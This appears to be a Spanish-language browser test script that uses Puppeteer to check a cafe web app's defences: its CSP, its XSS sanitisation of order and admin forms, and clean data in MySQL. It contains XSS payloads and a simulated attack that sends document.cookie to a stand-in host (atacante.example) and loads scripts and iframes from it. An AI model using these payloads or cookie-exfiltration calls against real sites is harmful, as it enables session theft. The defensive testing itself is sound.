// =============================================================
// Pruebas en un navegador real (Chrome + Puppeteer) – Fase 3.
// Uso:  PUPPETEER_CORE=<ruta a puppeteer-core> ADMIN_PASSWORD=... node prueba-navegador.mjs
//  A. La CSP no rompe la app: sin violaciones ni errores en consola,
//     imágenes (next/image) y fuentes (next/font) cargadas.
//  B. Ataque XSS por el formulario de pedido (interfaz real).
//  C. Ataque XSS por el panel admin + carga diferida del formulario (next/dynamic).
//  D. La CSP bloquea scripts externos, fetch a otro dominio e iframes.
//  E. phpMyAdmin: los datos quedaron limpios en MySQL.
// Si algún alert() llegara a ejecutarse, Puppeteer recibe un evento "dialog".
// =============================================================
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { pathToFileURL } from "node:url";

const puppeteer = (await import(pathToFileURL(process.env.PUPPETEER_CORE).href)).default;
const base = process.env.URL_BASE ?? "http://localhost:3005";
const capturas = join(import.meta.dirname, "..", "capturas");
const resultados = join(import.meta.dirname, "..", "resultados");
mkdirSync(capturas, { recursive: true });

const navegador = await puppeteer.launch({
  executablePath: process.env.CHROME_PATH ?? "C:/Program Files/Google/Chrome/Application/chrome.exe",
  headless: true,
  defaultViewport: { width: 1280, height: 860, deviceScaleFactor: 1.5 },
  args: ["--lang=es-BO"],
});
const pagina = await navegador.newPage();
const informe = { dialogos: [], erroresConsola: [], violacionesCSP: [], pasos: [] };
const paso = (t) => { console.log("•", t); informe.pasos.push(t); };

// Cualquier alert/confirm/prompt = XSS ejecutado. Lo registramos y cerramos.
pagina.on("dialog", async (d) => { informe.dialogos.push(d.message()); await d.dismiss(); });
pagina.on("console", (m) => { if (m.type() === "error") informe.erroresConsola.push(m.text()); });
// Registra en la página cada violación de la CSP
await pagina.evaluateOnNewDocument(() => {
  window.__violaciones = [];
  document.addEventListener("securitypolicyviolation", (e) =>
    window.__violaciones.push({ directiva: e.violatedDirective, bloqueado: e.blockedURI }),
  );
});
const violaciones = () => pagina.evaluate(() => window.__violaciones ?? []);
const foto = (nombre, opciones = {}) => pagina.screenshot({ path: join(capturas, nombre), ...opciones });
const esperar = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------- A. La CSP no rompe la aplicación ----------
for (const ruta of ["/", "/menu", "/carrito", "/admin/login"]) {
  await pagina.goto(base + ruta, { waitUntil: "networkidle0" });
  await pagina.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
  await esperar(800);
  const estado = await pagina.evaluate(async () => {
    await document.fonts.ready;
    const imgs = [...document.images];
    return {
      imagenes: imgs.length,
      imagenesRotas: imgs.filter((i) => i.complete && i.naturalWidth === 0).length,
      fuentes: [...document.fonts].filter((f) => f.status === "loaded").map((f) => f.family),
    };
  });
  const v = await violaciones();
  informe.violacionesCSP.push(...v.map((x) => ({ ruta, ...x })));
  paso(`A ${ruta}: ${estado.imagenes} imágenes (${estado.imagenesRotas} rotas), fuentes cargadas: ${[...new Set(estado.fuentes)].join(", ") || "ninguna"}, violaciones CSP: ${v.length}`);
}

// ---------- B. XSS en el formulario de pedido ----------
await pagina.goto(base + "/menu", { waitUntil: "networkidle0" });
await pagina.click("button[aria-label^='Agregar']");
await pagina.goto(base + "/carrito", { waitUntil: "networkidle0" });
const ataqueCliente = "<img src=x onerror=alert('XSS')>Ana Rojas";
const ataqueNota = "<script>alert('XSS')</script>Sin azúcar, por favor";
await pagina.type("#cliente", ataqueCliente);
await pagina.type("#telefono", "71234567");
await pagina.type("#nota", ataqueNota);
await pagina.$eval("#titulo-form", (e) => e.scrollIntoView({ block: "start" }));
await pagina.evaluate(() => window.scrollBy(0, -90));
await foto("xss-01-pedido-formulario-con-ataque.png");
await Promise.all([pagina.waitForNavigation({ waitUntil: "networkidle0" }), pagina.click("button[type=submit]")]);
await esperar(500);
const confirmacion = await pagina.evaluate(() => document.querySelector("main")?.innerText ?? "");
paso(`B Pedido enviado → ${pagina.url().replace(base, "")}; alert() ejecutados: ${informe.dialogos.length}`);
paso(`B Texto mostrado contiene "<script": ${confirmacion.includes("<script")}, contiene "onerror": ${confirmacion.includes("onerror")}`);
await foto("xss-02-pedido-confirmacion-limpia.png", { fullPage: true });

// ---------- C. XSS en el panel admin + next/dynamic ----------
await pagina.goto(base + "/admin/login", { waitUntil: "networkidle0" });
await pagina.type("input[type=password]", process.env.ADMIN_PASSWORD);
await Promise.all([pagina.waitForNavigation({ waitUntil: "networkidle0" }), pagina.click("button[type=submit]")]);
const chunksDiferidos = [];
const alPedir = (r) => r.url().includes("/_next/static/chunks/") && chunksDiferidos.push(r.url().split("/").pop());
pagina.on("request", alPedir);
await pagina.evaluate(() => [...document.querySelectorAll("button")].find((b) => b.textContent.includes("Nuevo producto")).click());
await pagina.waitForSelector("#p-nombre");
pagina.off("request", alPedir);
paso(`C next/dynamic: al abrir "Nuevo producto" se descargó el chunk ${chunksDiferidos.join(", ") || "(ya en caché)"}`);
await pagina.type("#p-nombre", "<script>alert('admin')</script>Mocha XSS");
await pagina.type("#p-descripcion", "<img src=x onerror=alert(document.cookie)>Mocha con chocolate amargo de la Chiquitanía");
await pagina.type("#p-precio", "22");
await pagina.select("#p-categoriaId", await pagina.$eval("#p-categoriaId option:nth-child(2)", (o) => o.value));
await pagina.type("#p-imagen", "https://images.unsplash.com/photo-1572442388796-11668a67e53d?w=800&q=75&auto=format&fit=crop");
await esperar(800);
await foto("xss-03-admin-formulario-con-ataque.png");
await pagina.evaluate(() => [...document.querySelectorAll("dialog button[type=submit]")][0].click());
await pagina.waitForSelector("[role=status]");
await esperar(600);
await pagina.evaluate(() => document.querySelector("[role=status]").scrollIntoView({ block: "start" }));
await pagina.evaluate(() => window.scrollBy(0, -120));
await foto("xss-04-admin-producto-guardado-limpio.png");
const aviso = await pagina.$eval("[role=status]", (e) => e.textContent);
paso(`C Aviso del panel: ${aviso.replace("Cerrar", "").trim()}; alert() ejecutados: ${informe.dialogos.length}`);

await pagina.goto(base + "/menu", { waitUntil: "networkidle0" });
await pagina.type("#buscar", "Mocha");
await esperar(800);
await pagina.evaluate(() => window.scrollTo(0, 150));
await foto("xss-05-menu-producto-limpio.png");

// ---------- D. La CSP bloquea código inyectado ----------
await pagina.goto(base + "/menu", { waitUntil: "networkidle0" });
const consolaAntes = informe.erroresConsola.length;
await pagina.evaluate(async () => {
  // Simula lo que haría un atacante que logró inyectar código:
  const s = document.createElement("script");
  s.src = "https://atacante.example/robar-cookies.js"; // 1. cargar script externo
  document.head.appendChild(s);
  try { await fetch("https://atacante.example/robar?datos=" + encodeURIComponent(document.cookie)); } catch {} // 2. enviar datos
  const f = document.createElement("iframe");
  f.src = "https://atacante.example/phishing"; // 3. incrustar un sitio falso
  document.body.appendChild(f);
  const o = document.createElement("object");
  o.data = "https://atacante.example/plugin.swf"; // 4. plugin
  document.body.appendChild(o);
});
await esperar(1200);
const bloqueos = await violaciones();
const mensajesConsola = informe.erroresConsola.slice(consolaAntes);
paso(`D Intentos bloqueados por la CSP: ${bloqueos.map((b) => `${b.directiva} → ${b.bloqueado}`).join(" | ")}`);
// Muestra en pantalla los bloqueos reales registrados por el navegador
await pagina.evaluate((lista, consola) => {
  const caja = document.createElement("div");
  caja.style.cssText =
    "position:fixed;inset:auto 16px 16px 16px;z-index:9999;background:#1e1e1e;color:#f48771;font:13px/1.5 Consolas,monospace;padding:14px 16px;border-radius:10px;box-shadow:0 8px 30px #0008";
  caja.innerHTML =
    "<div style='color:#fff;font-weight:bold;margin-bottom:6px'>Consola de Chrome · eventos securitypolicyviolation registrados</div>" +
    lista.map((b) => `<div>⛔ Bloqueado por CSP (${b.directiva}): ${b.bloqueado}</div>`).join("") +
    "<div style='color:#aaa;margin-top:8px'>" + consola.slice(0, 4).map((m) => m.slice(0, 150)).join("<br>") + "</div>";
  document.body.appendChild(caja);
}, bloqueos, mensajesConsola);
await foto("csp-06-bloqueo-de-codigo-inyectado.png");

// Clickjacking: la figura (antes vs. después) se genera con captura-clickjacking.mjs,
// que necesita las dos versiones encendidas (3006 original y 3005 protegida).

// ---------- E. phpMyAdmin ----------
const sql = (q) => `http://localhost/phpmyadmin/index.php?route=/sql&db=cafeteria_db&sql_query=${encodeURIComponent(q)}`;
for (const [archivo, consulta] of [
  ["db-08-phpmyadmin-pedidos-limpios.png", "SELECT id, cliente, telefono, nota, total, fecha FROM pedidos ORDER BY id DESC LIMIT 8"],
  ["db-09-phpmyadmin-productos-limpios.png", "SELECT id, nombre, LEFT(descripcion, 70) AS descripcion, precio, disponible FROM productos ORDER BY id DESC LIMIT 6"],
]) {
  await pagina.goto(sql(consulta), { waitUntil: "networkidle0" });
  await esperar(800);
  await foto(archivo);
}

informe.alertsEjecutados = informe.dialogos.length;
writeFileSync(join(resultados, "prueba-navegador.json"), JSON.stringify(informe, null, 2));
console.log("\nalert() ejecutados en total:", informe.dialogos.length);
console.log("Errores de consola (fuera de la prueba D):", informe.erroresConsola.length - mensajesConsola.length);
await navegador.close();
